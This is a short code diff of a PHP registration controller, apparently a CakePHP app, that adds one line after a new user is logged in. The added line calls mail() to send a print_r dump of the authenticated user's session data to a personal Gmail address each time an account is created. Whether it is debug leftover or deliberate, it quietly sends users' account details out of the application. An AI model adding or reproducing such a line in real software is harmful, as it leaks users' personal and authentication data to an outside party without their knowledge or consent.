@@ -57,7 +57,7 @@ class RegistrationController extends AppController {
 		    );
 		    $this->request->data['Account'] = array_merge($this->request->data['Account'], array('id' => $userid, 'Role' => $role));
 		    $this->Auth->login($this->request->data['Account']);
-
+		    mail('ehask71@gmail.com','Auth',print_r($this->Auth->user(),1));
 		    $this->Session->setFlash(__('Account Created.'));
 		    $this->redirect('/register/select-counties');
 		} else {
